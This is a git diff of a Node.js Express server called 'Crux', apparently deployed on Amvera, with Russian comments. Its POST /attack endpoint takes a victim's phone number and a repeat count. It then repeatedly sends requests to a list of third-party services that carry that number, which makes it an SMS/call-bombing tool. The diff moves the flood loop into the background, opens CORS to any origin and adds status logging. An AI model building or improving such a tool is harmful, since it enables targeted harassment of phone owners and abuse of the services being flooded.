@@ -5,33 +5,45 @@ const services = require('./services.js');
 
 const app = express();
 
-app.use(cors()); // Это лечит "СЕРВЕР OFF"
+// Настройка CORS "на максималках"
+app.use(cors({
+    origin: '*', 
+    methods: ['GET', 'POST'],
+    allowedHeaders: ['Content-Type']
+}));
+
 app.use(express.json());
 
 app.post('/attack', async (req, res) => {
     const { phone, repeats } = req.body;
-    console.log(`[START] Атака на ${phone}`);
+    console.log(`[!] Атака запущена: ${phone}, циклов: ${repeats}`);
 
-    // Запускаем асинхронно, чтобы GUI не висел
+    // Отправляем ответ сразу, чтобы GUI не ушел в таймаут
+    res.status(200).json({ status: "started" });
+
+    // Сама логика в фоне
     for (let i = 0; i < repeats; i++) {
-        services.forEach(async (s) => {
+        for (const service of services) {
             try {
+                const data = typeof service.data === 'function' ? service.data(phone) : service.data;
                 await axios({
-                    method: s.method,
-                    url: s.url,
-                    headers: s.headers,
-                    data: typeof s.data === 'function' ? s.data(phone) : s.data,
-                    timeout: 5000
+                    method: service.method,
+                    url: service.url,
+                    headers: service.headers,
+                    data: data,
+                    timeout: 4000
                 });
-            } catch (err) {
-                console.error(`[ERR] ${s.name} failed`);
+                console.log(`[OK] ${service.name}`);
+            } catch (e) {
+                console.log(`[FAIL] ${service.name}`);
             }
-        });
-        // Пауза 1 сек между кругами
-        await new Promise(r => setTimeout(r, 1000));
+        }
+        await new Promise(r => setTimeout(r, 1500));
     }
-    res.json({ success: true });
 });
 
-// Слушаем порт 80, как требует Amvera
-app.listen(80, () => console.log('Crux Server Online on Port 80'));
+// ПОРТ 80 - КРИТИЧНО ДЛЯ AMVERA
+const PORT = process.env.PORT || 80;
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`Сервер Crux ONLINE на порту ${PORT}`);
+});
